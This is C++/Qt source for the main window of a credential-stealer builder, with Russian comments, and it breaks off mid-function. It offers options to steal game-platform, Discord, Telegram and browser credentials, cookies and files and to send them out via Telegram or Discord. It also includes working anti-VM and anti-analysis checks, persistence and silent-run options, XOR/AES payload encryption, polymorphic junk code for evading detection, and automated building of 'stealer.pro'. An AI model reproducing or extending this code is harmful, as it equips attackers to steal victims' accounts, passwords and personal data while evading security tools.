#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QMessageBox>
#include <QProcess>
#include <QFileDialog>
#include <QFile>
#include <QTextStream>
#include <QPropertyAnimation>
#include <QTimer>
#include <QDebug>
#include <QScreen>
#include <QPixmap>
#include <QJsonDocument>
#include <QJsonObject>
#include <QNetworkReply>
#include <QHttpMultiPart>
#include <QHostInfo>
#include <QSettings>
#include <QDir>
#include <QRegularExpression>
#include <QGuiApplication>
#include <QThread>
#include <QSysInfo>
#include <QClipboard>
#include <random>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <vector>
#include <string>
#include <fstream>
#include <windows.h>
#include <bcrypt.h>
#include <zip.h>
#include <sqlite3.h>
#include <curl/curl.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <psapi.h>

// Определение глобальной переменной
MainWindow* g_mainWindow = nullptr;

// Функция для получения данных от libcurl
static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    s->append((char*)contents, newLength);
    return newLength;
}

// Генерация уникального XOR-ключа
std::string MainWindow::generateUniqueXorKey() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    std::stringstream ss;
    for (int i = 0; i < 16; ++i) {
        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);
    }
    return ss.str();
}

// Получение ключа шифрования
std::array<unsigned char, 16> MainWindow::GetEncryptionKey(bool useFirstKey) {
    std::string keyStr = useFirstKey ? config.encryptionKey1 : config.encryptionKey2;
    if (keyStr.empty()) {
        keyStr = generateUniqueXorKey();
        if (useFirstKey) {
            config.encryptionKey1 = keyStr;
        } else {
            config.encryptionKey2 = keyStr;
        }
    }

    std::array<unsigned char, 16> key;
    if (keyStr.length() >= 32) {
        for (size_t i = 0; i < 16; ++i) {
            std::string byteStr = keyStr.substr(i * 2, 2);
            key[i] = static_cast<unsigned char>(std::stoi(byteStr, nullptr, 16));
        }
    } else {
        for (size_t i = 0; i < 16; ++i) {
            key[i] = static_cast<unsigned char>(keyStr[i % keyStr.length()]);
        }
    }
    return key;
}

// Генерация инициализационного вектора (IV)
std::array<unsigned char, 16> MainWindow::generateIV() {
    std::array<unsigned char, 16> iv;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    for (auto& byte : iv) {
        byte = static_cast<unsigned char>(dis(gen));
    }
    return iv;
}

// Применение XOR-шифрования
QByteArray MainWindow::applyXOR(const QByteArray& data, const std::array<unsigned char, 16>& key) {
    QByteArray result = data;
    for (int i = 0; i < data.size(); ++i) {
        result[i] = data[i] ^ key[i % key.size()];
    }
    return result;
}

// Применение AES-шифрования
QByteArray MainWindow::applyAES(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0))) {
        emitLog("Ошибка: Не удалось открыть алгоритм AES\n");
        return QByteArray();
    }

    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        emitLog("Ошибка: Не удалось установить режим цепочки AES\n");
        return QByteArray();
    }

    DWORD keyObjectSize = 0, dataSize = 0;
    DWORD cbResult = 0;
    if (!BCRYPT_SUCCESS(BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjectSize, sizeof(DWORD), &cbResult, 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        emitLog("Ошибка: Не удалось получить размер объекта ключа AES\n");
        return QByteArray();
    }

    std::vector<BYTE> keyObject(keyObjectSize);
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, keyObject.data(), keyObjectSize, (PUCHAR)key.data(), (ULONG)key.size(), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        emitLog("Ошибка: Не удалось сгенерировать ключ AES\n");
        return QByteArray();
    }

    if (!BCRYPT_SUCCESS(BCryptEncrypt(hKey, (PUCHAR)data.constData(), data.size(), nullptr, (PUCHAR)iv.data(), iv.size(), nullptr, 0, &dataSize, BCRYPT_BLOCK_PADDING))) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        emitLog("Ошибка: Не удалось вычислить размер зашифрованных данных\n");
        return QByteArray();
    }

    std::vector<BYTE> encryptedData(dataSize);
    if (!BCRYPT_SUCCESS(BCryptEncrypt(hKey, (PUCHAR)data.constData(), data.size(), nullptr, (PUCHAR)iv.data(), iv.size(), encryptedData.data(), dataSize, &cbResult, BCRYPT_BLOCK_PADDING))) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        emitLog("Ошибка: Не удалось зашифровать данные\n");
        return QByteArray();
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return QByteArray((char*)encryptedData.data(), cbResult);
}

// Дешифрование AES
QByteArray applyAESDecrypt(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0))) {
        return QByteArray();
    }

    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return QByteArray();
    }

    DWORD keyObjectSize = 0, dataSize = 0;
    DWORD cbResult = 0;
    if (!BCRYPT_SUCCESS(BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&keyObjectSize, sizeof(DWORD), &cbResult, 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return QByteArray();
    }

    std::vector<BYTE> keyObject(keyObjectSize);
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, keyObject.data(), keyObjectSize, (PUCHAR)key.data(), (ULONG)key.size(), 0))) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return QByteArray();
    }

    if (!BCRYPT_SUCCESS(BCryptDecrypt(hKey, (PUCHAR)data.constData(), data.size(), nullptr, (PUCHAR)iv.data(), iv.size(), nullptr, 0, &dataSize, BCRYPT_BLOCK_PADDING))) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return QByteArray();
    }

    std::vector<BYTE> decryptedData(dataSize);
    if (!BCRYPT_SUCCESS(BCryptDecrypt(hKey, (PUCHAR)data.constData(), data.size(), nullptr, (PUCHAR)iv.data(), iv.size(), decryptedData.data(), dataSize, &cbResult, BCRYPT_BLOCK_PADDING))) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return QByteArray();
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return QByteArray((char*)decryptedData.data(), cbResult);
}

// Проверка на виртуальную машину
bool MainWindow::isRunningInVM() {
    bool isVM = false;

    // Проверка реестра на наличие признаков виртуальной машины
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\Disk\\Enum", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t value[512];
        DWORD size = sizeof(value);
        if (RegQueryValueExW(hKey, L"0", NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS) {
            if (wcsstr(value, L"VMware") || wcsstr(value, L"VirtualBox") || wcsstr(value, L"QEMU")) {
                isVM = true;
            }
        }
        RegCloseKey(hKey);
    }

    // Проверка количества процессоров
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors <= 1) isVM = true;

    // Проверка объёма памяти
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(memInfo);
    GlobalMemoryStatusEx(&memInfo);
    if (memInfo.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) isVM = true;

    // Проверка процессов, связанных с виртуальными машинами
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hProcessSnap, &pe32)) {
            do {
                std::wstring processName = pe32.szExeFile;
                std::transform(processName.begin(), processName.end(), processName.begin(), ::towlower);
                if (processName.find(L"vmtoolsd.exe") != std::wstring::npos ||
                    processName.find(L"vboxservice.exe") != std::wstring::npos ||
                    processName.find(L"qemu-ga.exe") != std::wstring::npos) {
                    isVM = true;
                    break;
                }
            } while (Process32NextW(hProcessSnap, &pe32));
        }
        CloseHandle(hProcessSnap);
    }

    // Проверка MAC-адреса (виртуальные машины часто используют специфические префиксы)
    PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
    }
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter) {
            if (pAdapter->AddressLength >= 3) {
                if ((pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x0C && pAdapter->Address[2] == 0x29) ||
                    (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x50 && pAdapter->Address[2] == 0x56) ||
                    (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x05 && pAdapter->Address[2] == 0x69)) {
                    isVM = true;
                    break;
                }
            }
            pAdapter = pAdapter->Next;
        }
    }
    free(pAdapterInfo);

    return isVM;
}

// Проверка на запуск в виртуальной машине (альтернативный метод)
bool MainWindow::AntiAnalysis() {
    return isRunningInVM();
}

// Удобный метод для вызова сигнала logUpdated
void MainWindow::emitLog(const QString& message) {
    QMutexLocker locker(&logMutex);
    emit logUpdated(message);
}

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
    , manager(new QNetworkAccessManager(this))
    , isBuilding(false)
    , buildTimer(new QTimer(this))
    , statusCheckTimer(new QTimer(this))
{
    ui->setupUi(this);
    g_mainWindow = this; // Инициализация глобальной переменной

    // Инициализация UI элементов
    tokenLineEdit = ui->tokenLineEdit;
    chatIdLineEdit = ui->chatIdLineEdit;
    discordWebhookLineEdit = ui->discordWebhookLineEdit;
    fileNameLineEdit = ui->filenameLineEdit;
    encryptionKey1LineEdit = ui->encryptionKey1LineEdit;
    encryptionKey2LineEdit = ui->encryptionKey2LineEdit;
    encryptionSaltLineEdit = ui->encryptionSaltLineEdit;
    iconPathLineEdit = ui->iconPathLineEdit;
    githubTokenLineEdit = ui->githubTokenLineEdit;
    githubRepoLineEdit = ui->githubRepoLineEdit;
    sendMethodComboBox = ui->sendMethodComboBox;
    buildMethodComboBox = ui->buildMethodComboBox;
    steamCheckBox = ui->steamCheckBox;
    steamMAFileCheckBox = ui->steamMAFileCheckBox;
    epicCheckBox = ui->epicCheckBox;
    robloxCheckBox = ui->robloxCheckBox;
    battlenetCheckBox = ui->battlenetCheckBox;
    minecraftCheckBox = ui->minecraftCheckBox;
    discordCheckBox = ui->discordCheckBox;
    telegramCheckBox = ui->telegramCheckBox;
    chatHistoryCheckBox = ui->chatHistoryCheckBox;
    cookiesCheckBox = ui->cookiesCheckBox;
    passwordsCheckBox = ui->passwordsCheckBox;
    screenshotCheckBox = ui->screenshotCheckBox;
    fileGrabberCheckBox = ui->fileGrabberCheckBox;
    systemInfoCheckBox = ui->systemInfoCheckBox;
    socialEngineeringCheckBox = ui->socialEngineeringCheckBox;
    antiVMCheckBox = ui->antiVMCheckBox;
    fakeErrorCheckBox = ui->fakeErrorCheckBox;
    silentCheckBox = ui->silentCheckBox;
    autoStartCheckBox = ui->autoStartCheckBox;
    persistCheckBox = ui->persistCheckBox;
    textEdit = ui->textEdit;
    iconBrowseButton = ui->iconBrowseButton;
    buildButton = ui->buildButton;
    actionSaveConfig = ui->actionSaveConfig;
    actionLoadConfig = ui->actionLoadConfig;
    actionExportLogs = ui->actionExportLogs;
    actionExit = ui->actionExit;
    actionAbout = ui->actionAbout;

    // Инициализация значений по умолчанию
    sendMethodComboBox->addItems({"Local File", "Telegram", "Discord"});
    buildMethodComboBox->addItems({"Local Build", "GitHub Actions"});

    // Анимация для логотипа
    QPropertyAnimation *logoAnimation = new QPropertyAnimation(ui->logoLabel, "geometry", this);
    logoAnimation->setDuration(1500);
    logoAnimation->setStartValue(QRect(0, -150, 600, 150));
    logoAnimation->setEndValue(QRect(0, 0, 600, 150));
    logoAnimation->setEasingCurve(QEasingCurve::OutBounce);
    logoAnimation->start();

    // Анимация пульсации для кнопки "Собрать"
    QPropertyAnimation *buttonAnimation = new QPropertyAnimation(ui->buildButton, "size", this);
    buttonAnimation->setDuration(1000);
    buttonAnimation->setStartValue(QSize(100, 40));
    buttonAnimation->setKeyValueAt(0.5, QSize(120, 50));
    buttonAnimation->setEndValue(QSize(100, 40));
    buttonAnimation->setLoopCount(-1);
    buttonAnimation->setEasingCurve(QEasingCurve::InOutQuad);
    buttonAnimation->start();

    // Анимация появления секций
    animateSection(ui->gamingSectionLabel, ui->gamingSpacer);
    animateSection(ui->messengersSectionLabel, ui->messengersSpacer);
    animateSection(ui->browserSectionLabel, ui->browserSpacer);
    animateSection(ui->additionalSectionLabel, ui->additionalSpacer);
    animateSection(ui->stealthSectionLabel, ui->verticalSpacer);

    // Инициализация строки состояния
    ui->statusbar->showMessage("Готово", 0);

    // Подключение сигналов и слотов
    connect(ui->buildButton, &QPushButton::clicked, this, &MainWindow::on_buildButton_clicked);
    connect(ui->iconBrowseButton, &QPushButton::clicked, this, &MainWindow::on_iconBrowseButton_clicked);
    connect(ui->actionSaveConfig, &QAction::triggered, this, &MainWindow::on_actionSaveConfig_triggered);
    connect(ui->actionLoadConfig, &QAction::triggered, this, &MainWindow::on_actionLoadConfig_triggered);
    connect(ui->actionExportLogs, &QAction::triggered, this, &MainWindow::on_actionExportLogs_triggered);
    connect(ui->actionExit, &QAction::triggered, this, &MainWindow::on_actionExit_triggered);
    connect(ui->actionAbout, &QAction::triggered, this, &MainWindow::on_actionAbout_triggered);
    connect(manager, &QNetworkAccessManager::finished, this, &MainWindow::replyFinished);
    connect(ui->sendMethodComboBox, &QComboBox::currentTextChanged, this, [this](const QString& text) {
        ui->statusbar->showMessage("Метод отправки: " + text, 0);
    });
    connect(this, &MainWindow::logUpdated, this, &MainWindow::appendLog);
    connect(this, &MainWindow::startStealSignal, this, &MainWindow::startStealProcess);

    // Подключение таймеров
    connect(buildTimer, &QTimer::timeout, this, &MainWindow::buildExecutable);
    connect(statusCheckTimer, &QTimer::timeout, this, &MainWindow::checkBuildStatus);
}

void MainWindow::animateSection(QLabel* sectionLabel, QSpacerItem* spacer)
{
    QWidget* parentWidget = sectionLabel->parentWidget();
    QVBoxLayout* layout = qobject_cast<QVBoxLayout*>(parentWidget->layout());
    if (!layout) return;

    QList<QWidget*> widgetsToAnimate;
    int startIndex = layout->indexOf(sectionLabel);
    int endIndex = spacer ? layout->indexOf(spacer) : layout->count();

    widgetsToAnimate.append(sectionLabel);
    for (int i = startIndex + 1; i < endIndex; ++i) {
        QLayoutItem* item = layout->itemAt(i);
        if (QWidget* widget = item->widget()) {
            if (dynamic_cast<QCheckBox*>(widget) || dynamic_cast<QComboBox*>(widget)) {
                widgetsToAnimate.append(widget);
            }
        }
    }

    for (QWidget* widget : widgetsToAnimate) {
        widget->setStyleSheet("opacity: 0;");
        widget->setMaximumHeight(0);
    }

    QParallelAnimationGroup* group = new QParallelAnimationGroup(this);
    for (QWidget* widget : widgetsToAnimate) {
        QPropertyAnimation* opacityAnimation = new QPropertyAnimation(widget, "windowOpacity");
        opacityAnimation->setDuration(500);
        opacityAnimation->setStartValue(0);
        opacityAnimation->setEndValue(1);
        opacityAnimation->setEasingCurve(QEasingCurve::OutCubic);

        QPropertyAnimation* heightAnimation = new QPropertyAnimation(widget, "maximumHeight");
        heightAnimation->setDuration(500);
        heightAnimation->setStartValue(0);
        heightAnimation->setEndValue(widget->sizeHint().height());
        heightAnimation->setEasingCurve(QEasingCurve::OutCubic);

        group->addAnimation(opacityAnimation);
        group->addAnimation(heightAnimation);
    }

    QTimer::singleShot(widgetsToAnimate.indexOf(sectionLabel) * 200, this, [group]() {
        group->start(QAbstractAnimation::DeleteWhenStopped);
    });
}

MainWindow::~MainWindow()
{
    delete ui;
    delete manager;
    delete buildTimer;
    delete statusCheckTimer;
    g_mainWindow = nullptr;
}

void MainWindow::generatePolymorphicCode()
{
    std::ofstream polyFile("polymorphic_code.h");
    if (!polyFile.is_open()) {
        emitLog("Ошибка: Не удалось создать polymorphic_code.h. Проверьте права доступа.\n");
        isBuilding = false;
        return;
    }

    polyFile << "#ifndef POLYMORPHIC_CODE_H\n";
    polyFile << "#define POLYMORPHIC_CODE_H\n\n";
    polyFile << "#include <random>\n";
    polyFile << "#include <string>\n";
    polyFile << "#include <sstream>\n";
    polyFile << "#include <iomanip>\n";
    polyFile << "#include <chrono>\n";
    polyFile << "#include <thread>\n\n";
    polyFile << "// Этот файл перегенерируется динамически в mainwindow.cpp через generatePolymorphicCode()\n\n";

    // Генерация getRandomNumber
    polyFile << "inline int getRandomNumber(int min, int max) {\n";
    polyFile << "    static std::random_device rd;\n";
    polyFile << "    static std::mt19937 gen(rd());\n";
    polyFile << "    std::uniform_int_distribution<> dis(min, max);\n";
    polyFile << "    return dis(gen);\n";
    polyFile << "}\n\n";

    // Генерация generateRandomString
    polyFile << "inline std::string generateRandomString(size_t length) {\n";
    polyFile << "    static const char alphanum[] =\n";
    polyFile << "        \"0123456789\"\n";
    polyFile << "        \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n";
    polyFile << "        \"abcdefghijklmnopqrstuvwxyz\";\n";
    polyFile << "    std::string result;\n";
    polyFile << "    result.reserve(length);\n";
    polyFile << "    for (size_t i = 0; i < length; ++i) {\n";
    polyFile << "        result += alphanum[getRandomNumber(0, sizeof(alphanum) - 2)];\n";
    polyFile << "    }\n";
    polyFile << "    return result;\n";
    polyFile << "}\n\n";

    // Генерация generateRandomFuncName
    polyFile << "inline std::string generateRandomFuncName() {\n";
    polyFile << "    static const char* prefixes[] = {\"polyFunc\", \"obfFunc\", \"cryptFunc\", \"hideFunc\", \"maskFunc\"};\n";
    polyFile << "    std::stringstream ss;\n";
    polyFile << "    ss << prefixes[getRandomNumber(0, 4)] << \"_\"\n";
    polyFile << "       << getRandomNumber(10000, 99999) << \"_\"\n";
    polyFile << "       << getRandomNumber(10000, 99999);\n";
    polyFile << "    return ss.str();\n";
    polyFile << "}\n\n";

    polyFile << "namespace Polymorphic {\n\n";

    // Генерация 5–10 полиморфных функций
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(5, 10);
    int funcCount = dis(gen);
    std::vector<std::string> funcNames;
    for (int i = 0; i < funcCount; ++i) {
        std::string funcName;
        do {
            std::stringstream ss;
            ss << "polyFunc_" << std::setw(5) << std::setfill('0') << dis(gen) << "_" << std::setw(5) << std::setfill('0') << dis(gen);
            funcName = ss.str();
        } while (std::find(funcNames.begin(), funcNames.end(), funcName) != funcNames.end());
        funcNames.push_back(funcName);
        polyFile << "    inline void " << funcName << "() {\n";
        polyFile << "        volatile int dummy_" << dis(gen) << "_" << dis(gen) << " = getRandomNumber(1000, 15000);\n";
        polyFile << "        std::string noise = generateRandomString(getRandomNumber(5, 20));\n";
        polyFile << "        volatile int dummy2_" << dis(gen) << "_" << dis(gen) << " = dummy_" << dis(gen) << "_" << dis(gen) << " ^ noise.length();\n";
        polyFile << "        for (int i = 0; i < getRandomNumber(3, 15); i++) {\n";
        polyFile << "            if (dummy2_" << dis(gen) << "_" << dis(gen) << " % 2 == 0) {\n";
        polyFile << "                dummy2_" << dis(gen) << "_" << dis(gen) << " = (dummy2_" << dis(gen) << "_" << dis(gen) << " << getRandomNumber(1, 3)) ^ noise[i % noise.length()];\n";
        polyFile << "            } else {\n";
        polyFile << "                dummy2_" << dis(gen) << "_" << dis(gen) << " = (dummy2_" << dis(gen) << "_" << dis(gen) << " >> getRandomNumber(1, 2)) + getRandomNumber(10, 50);\n";
        polyFile << "            }\n";
        polyFile << "        }\n";
        polyFile << "        std::this_thread::sleep_for(std::chrono::milliseconds(getRandomNumber(1, 10)));\n";
        polyFile << "    }\n\n";
    }

    // Генерация executePolymorphicCode
    polyFile << "    inline void executePolymorphicCode() {\n";
    for (const auto& funcName : funcNames) {
        polyFile << "        " << funcName << "();\n";
    }
    polyFile << "    }\n\n";

    polyFile << "} // namespace Polymorphic\n\n";
    polyFile << "#endif // POLYMORPHIC_CODE_H\n";

    polyFile.close();
    emitLog("Полиморфный код сгенерирован в polymorphic_code.h\n");
}

void MainWindow::generateBuildKeyHeader()
{
    std::ofstream keyFile("build_key.h");
    if (!keyFile.is_open()) {
        emitLog("Ошибка: Не удалось создать build_key.h. Проверьте права доступа.\n");
        isBuilding = false;
        return;
    }

    keyFile << "#ifndef BUILD_KEY_H\n";
    keyFile << "#define BUILD_KEY_H\n\n";
    keyFile << "#include <array>\n";
    keyFile << "#include <string>\n\n";
    keyFile << "// Этот файл генерируется автоматически в mainwindow.cpp через generateBuildKeyHeader()\n\n";

    keyFile << "inline std::array<unsigned char, 16> GetStaticEncryptionKey(const std::string& keyStr) {\n";
    keyFile << "    std::array<unsigned char, 16> key;\n";
    keyFile << "    if (keyStr.length() >= 32) {\n";
    keyFile << "        for (size_t i = 0; i < 16; ++i) {\n";
    keyFile << "            std::string byteStr = keyStr.substr(i * 2, 2);\n";
    keyFile << "            key[i] = static_cast<unsigned char>(std::stoi(byteStr, nullptr, 16));\n";
    keyFile << "        }\n";
    keyFile << "    } else {\n";
    keyFile << "        for (size_t i = 0; i < 16; ++i) {\n";
    keyFile << "            key[i] = static_cast<unsigned char>(keyStr[i % keyStr.length()]);\n";
    keyFile << "        }\n";
    keyFile << "    }\n";
    keyFile << "    return key;\n";
    keyFile << "}\n\n";

    keyFile << "inline std::string GenerateUniqueXorKey() {\n";
    keyFile << "    std::random_device rd;\n";
    keyFile << "    std::mt19937 gen(rd());\n";
    keyFile << "    std::uniform_int_distribution<> dis(0, 255);\n";
    keyFile << "    std::stringstream ss;\n";
    keyFile << "    for (int i = 0; i < 16; ++i) {\n";
    keyFile << "        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);\n";
    keyFile << "    }\n";
    keyFile << "    return ss.str();\n";
    keyFile << "}\n\n";

    keyFile << "inline std::string GenerateRandomSalt() {\n";
    keyFile << "    std::random_device rd;\n";
    keyFile << "    std::mt19937 gen(rd());\n";
    keyFile << "    std::uniform_int_distribution<> dis(0, 255);\n";
    keyFile << "    std::stringstream ss;\n";
    keyFile << "    for (int i = 0; i < 8; ++i) {\n";
    keyFile << "        ss << std::hex << std::setw(2) << std::setfill('0') << dis(gen);\n";
    keyFile << "    }\n";
    keyFile << "    return ss.str();\n";
    keyFile << "}\n\n";

    keyFile << "#endif // BUILD_KEY_H\n";

    keyFile.close();
    emitLog("Файл ключей шифрования сгенерирован в build_key.h\n");
}

void MainWindow::copyIconToBuild()
{
    QString iconPath = ui->iconPathLineEdit->text();
    if (!iconPath.isEmpty()) {
        try {
            std::filesystem::copy_file(iconPath.toStdString(), "icon.ico", std::filesystem::copy_options::overwrite_existing);
            emitLog("Иконка скопирована в директорию сборки: icon.ico\n");
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования иконки: " + QString::fromStdString(e.what()) + "\n");
            isBuilding = false;
        }
    }
}

void MainWindow::buildExecutable()
{
    // Генерация мусорного кода (имитация)
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1000, 5000);
    volatile int dummy = dis(gen);
    for (int i = 0; i < dummy; ++i) {
        dummy ^= (dummy << 1) ^ (dummy >> 1);
    }
    emitLog("Выполнен мусорный код перед началом сборки\n");

    std::string buildDir = std::string(std::getenv("TEMP")) + "\\DeadCode_Build_" + std::to_string(GetTickCount());
    QDir().mkpath(QString::fromStdString(buildDir));
    emitLog("Создана директория для сборки: " + QString::fromStdString(buildDir) + "\n");

    try {
        std::filesystem::create_directories(buildDir + "\\src");
        for (const auto& entry : std::filesystem::directory_iterator(".")) {
            if (entry.path().filename() == "mainwindow.h" ||
                entry.path().filename() == "mainwindow.cpp" ||
                entry.path().filename() == "main.cpp" ||
                entry.path().filename() == "mainwindow.ui" ||
                entry.path().filename() == "polymorphic_code.h" ||
                entry.path().filename() == "build_key.h") {
                std::filesystem::copy_file(entry.path(), buildDir + "\\src\\" + entry.path().filename().string(), std::filesystem::copy_options::overwrite_existing);
            }
        }
        if (!ui->iconPathLineEdit->text().isEmpty()) {
            std::filesystem::copy_file(ui->iconPathLineEdit->text().toStdString(), buildDir + "\\icon.ico", std::filesystem::copy_options::overwrite_existing);
        }
        emitLog("Исходные файлы скопированы в " + QString::fromStdString(buildDir) + "\n");
    } catch (const std::exception& e) {
        emitLog("Ошибка копирования исходных файлов: " + QString::fromStdString(e.what()) + "\n");
        isBuilding = false;
        return;
    }

    std::ofstream proFile(buildDir + "\\stealer.pro");
    if (proFile.is_open()) {
        proFile << "QT += core gui network\n";
        proFile << "greaterThan(QT_MAJOR_VERSION, 4): QT += widgets\n";
        proFile << "TARGET = " << config.filename.substr(0, config.filename.find(".exe")) << "\n";
        proFile << "TEMPLATE = app\n";
        proFile << "SOURCES += src/main.cpp src/mainwindow.cpp\n";
        proFile << "HEADERS += src/mainwindow.h src/polymorphic_code.h src/build_key.h\n";
        proFile << "FORMS += src/mainwindow.ui\n";
        if (!ui->iconPathLineEdit->text().isEmpty()) {
            proFile << "RC_ICONS = icon.ico\n";
        }
        proFile << "LIBS += -luser32 -lbcrypt -lsqlite3 -lzip -lcurl\n";
        proFile.close();
        emitLog("Сгенерирован файл проекта: stealer.pro\n");
    } else {
        emitLog("Ошибка: Не удалось создать stealer.pro\n");
        isBuilding = false;
        return;
    }

    QProcess process;
    process.setWorkingDirectory(QString::fromStdString(buildDir));

    QString qmakePath = QStandardPaths::findExecutable("qmake");
    QString makePath = QStandardPaths::findExecutable("mingw32-make");
    if (qmakePath.isEmpty() || makePath.isEmpty()) {
        QString qtDir = qgetenv("QT_DIR");
        if (!qtDir.isEmpty()) {
            qmakePath = qtDir + "/bin/qmake.exe";
            makePath = qtDir + "/../mingw/bin/mingw32-make.exe";
        } else {
            emitLog("Ошибка: qmake или mingw32-make не найдены. Убедитесь, что Qt и MinGW установлены и добавлены в PATH.\n");
            isBuilding = false;
            return;
        }
    }

    process.start(qmakePath, QStringList() << "stealer.pro");
    if (!process.waitForFinished() || process.exitCode() != 0) {
        emitLog("Ошибка выполнения qmake: " + process.readAllStandardError() + "\n");
        isBuilding = false;
        return;
    }
    emitLog("qmake выполнен успешно\n");

    process.start(makePath);
    if (!process.waitForFinished() || process.exitCode() != 0) {
        emitLog("Ошибка выполнения mingw32-make: " + process.readAllStandardError() + "\n");
        isBuilding = false;
        return;
    }
    emitLog("mingw32-make выполнен успешно\n");

    std::string exePath = buildDir + "\\release\\" + config.filename;
    std::string outputPath = QDir::currentPath().toStdString() + "\\" + config.filename;
    try {
        std::filesystem::copy_file(exePath, outputPath, std::filesystem::copy_options::overwrite_existing);
        emitLog("Готовый билд сохранен: " + QString::fromStdString(outputPath) + "\n");
    } catch (const std::exception& e) {
        emitLog("Ошибка копирования билда: " + QString::fromStdString(e.what()) + "\n");
        isBuilding = false;
        return;
    }

    try {
        std::filesystem::remove_all(buildDir);
        emitLog("Временная директория сборки удалена\n");
    } catch (const std::exception& e) {
        emitLog("Ошибка удаления временной директории: " + QString::fromStdString(e.what()) + "\n");
    }

    isBuilding = false;
    ui->statusbar->showMessage("Сборка завершена", 0);
    emit startStealSignal();
}

void MainWindow::triggerGitHubActions()
{
    QString githubToken = ui->githubTokenLineEdit->text();
    QString githubRepo = ui->githubRepoLineEdit->text();
    if (githubToken.isEmpty() || githubRepo.isEmpty()) {
        emitLog("Ошибка: GitHub Token или репозиторий не указаны\n");
        isBuilding = false;
        return;
    }

    QNetworkRequest request(QUrl("https://api.github.com/repos/" + githubRepo + "/actions/workflows/build.yml/dispatches"));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    request.setRawHeader("Authorization", "token " + githubToken.toUtf8());
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QJsonObject json;
    json["ref"] = "main";
    QByteArray data = QJsonDocument(json).toJson();

    QNetworkReply *reply = manager->post(request, data);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() == QNetworkReply::NoError) {
            emitLog("Сборка успешно запущена через GitHub Actions\n");
            QJsonObject response = QJsonDocument::fromJson(reply->readAll()).object();
